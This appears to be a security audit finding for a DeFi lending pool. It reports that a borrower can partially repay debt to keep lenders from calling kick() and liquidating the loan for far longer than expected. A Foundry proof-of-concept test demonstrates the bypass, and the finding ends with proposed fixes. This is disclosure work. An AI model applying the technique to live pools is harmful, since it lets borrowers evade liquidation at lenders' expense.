# Borrowers are able to protect themselves from liquidation by dosing the kick function to extend their loan by over 10 times

## Summary
Users are able to use the `drawDebt()` function to supply collateral tokens and increase debt by withdrawing quote tokens. When a borrower is unable to repay their debt, lenders can use the `kick()` to send a borrower into liquidation, which their assets will be sent off to auction however, if borrowers foresee that they are being liquidated, can prevent this and extend their loan by more than 10 times the usual duration. 

## Vulnerability Detail
Borrowers can exploit this issue by adding a small portion on top of the loan they intend to borrow either pay that portion back immediately or if they see in the mempool that they are about to be liquidated, front-run the liquidator and repay that portion back then. If they were to take out a loan without the extra portion, lenders would be allowed to liquidate them in a reasonable amount of time. For example, Charlie intends to borrow 1.48 WETH for 2400 dai but deposits 3200 dai for 2 WETH. Charlie sees he is about to be liquidated by Bob after around 50 days - he exploits this issue by depositing a small portion of his loan back into the pool and extends the time of by a very large amount.

*Proof of Concept:*
```solidity
    function testLiquidationProtection() public {
        
        // ============== Setup Scenario ==============
        uint256 interestRateOne = 0.05 * 10**18;  // Standard interest rate used in testing
        address poolThreeAddr = erc20PoolFactory.deployPool(address(dai), address(weth), interestRateOne);
        ERC20Pool poolThree = ERC20Pool(address(poolThreeAddr));
        vm.label(poolThreeAddr, "DAI / WETH Pool Three");

        // Setup scenario and send liquidity providers some tokens
        vm.startPrank(address(daiDoner));
        dai.transfer(address(charlie), 3200 ether);
        vm.stopPrank();

        vm.startPrank(address(wethDoner));
        weth.transfer(address(bob), 1000 ether);
        vm.stopPrank();

        // ==============================================


        // Note At the time (24/01/2023) of writing ETH is currently 1,625.02 DAI,
        // so this would be a popular bucket to deposit in.

        // Start Scenario
        uint256 fenwick = 5635;

        vm.startPrank(address(alice));
        weth.deposit{value: 2 ether}();
        weth.approve(address(poolThree), 2.226 ether);
        poolThree.addQuoteToken(2 ether, fenwick); 
        vm.stopPrank();

        vm.startPrank(address(bob));
        weth.deposit{value: 9 ether}();
        weth.approve(address(poolThree), 9 ether);
        poolThree.addQuoteToken(9 ether, fenwick); 
        vm.stopPrank();


        // ======================== start testing ========================


        vm.startPrank(address(charlie)); 
        dai.approve(address(poolThree), 3200 ether);
        poolThree.drawDebt(address(charlie), 2 ether, fenwick, 3200 ether);

        weth.deposit{value: 0.5 ether}();
        weth.approve(address(poolThree), 2.5 ether);
        poolThree.repayDebt(address(charlie), 0.625 ether, 800 ether); // portion of the loan is repaid immediately to deny liquidity for an over extended period of time
        vm.stopPrank();


        vm.warp(block.timestamp + 625 days);

        // This amount of time allows bob to perform liquidation if a portion of the loan was never paid
        // vm.warp(block.timestamp + 50 days); 

        vm.startPrank(address(bob));
        weth.deposit{value: 0.5 ether}();
        weth.approve(address(poolThree), 0.5 ether);
        poolThree.kick(address(charlie)); // <----- reverts "BorrowerOK()"
        vm.stopPrank();


    }
```


## Impact
Instead of being able to liquidate Charlie after approximately 50 days (loan amount minus the small portion), Bob is denied the action to liquidate charlie until a duration of nearly 2 years.

Manual Review

## Recommendation
It is not exactly clear how the duration of the borrowers loan term works however, I believe this is a side effect in the way a borrowers upfront collateral is considered when determining if a user is collateralised when attempting to call the `kick()` function. I recommend a couple of ways that this issue can be resolved - A. If the user were to payoff 25% of their debt, that their debt is only extended by 25% of the original duration. For example, in the above scenario, the lender should be allowed to send the user into liquidation after 62.5 days instead of over 625 days. B. The users loan term duration stands and the full amount should be paid off by the end of the duration of the loan.
